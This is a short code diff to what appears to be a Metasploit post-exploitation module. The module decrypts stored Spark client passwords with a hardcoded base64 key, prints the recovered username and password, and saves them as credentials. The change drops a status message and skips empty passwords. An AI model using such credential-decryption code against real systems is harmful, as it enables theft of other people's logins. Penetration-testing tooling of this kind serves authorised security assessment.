@@ -40,8 +40,6 @@ class Metasploit3 < Msf::Post
 	# decrypt spark password
 	def decrypt(hash)
 		# code to decrypt hash with KEY
-		print_status("Starting to decrypt password hash")
-
 		encrypted = hash.unpack("m")[0]
 		key = "ugfpV1dMC5jyJtqwVAfTpHkxqJ0+E0ae".unpack("m")[0]
 
@@ -55,6 +53,7 @@ class Metasploit3 < Msf::Post
 		password = ::Rex::Text.to_utf8(password)
 
 		user, pass = password.scan(/[[:print:]]+/)
+		return if pass.nil? or pass.empty?
 		print_good("Decrypted Username #{user} Password: #{pass}")
 
 		store_creds(user, pass)
